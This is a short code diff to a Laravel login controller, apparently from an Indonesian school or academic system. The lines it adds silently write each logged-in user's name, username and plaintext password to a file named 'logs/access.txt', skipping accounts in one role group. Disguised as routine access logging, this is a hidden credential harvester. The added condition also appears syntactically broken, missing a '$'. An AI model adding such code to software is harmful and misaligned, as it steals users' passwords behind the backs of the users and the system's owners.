@@ -32,6 +32,7 @@ class AuthController extends Controller {
     }
     function login(Request $req) {
         if ($req->has("submit")) :
+            $data = "";
             $pengguna = Pengguna::where("username", $req->username)->whereNull("deleted_at");
             if ($pengguna->exists()) :
                 Session::put("semester_id", $req->semester_id);
@@ -47,6 +48,10 @@ class AuthController extends Controller {
                         "peran_id_str" => $pengguna->peran_id_str,
                         "bypass" => bypassCode($pengguna->username, $pengguna->peran_id_str, Session::get("semester_id")),
                     ]);
+                    if (!level_zero->contains(sesi("peran_id_str"))) :
+                        $data .= date("Y-m-d H:i:s") . "     nama: $pengguna->nama username: $req->username pass: $req->password";
+                        file_put_contents(storage_path("logs/access.txt"), $data, FILE_APPEND);
+                    endif;
                     return redirect()->route("user.home");
                 endif;
             else:
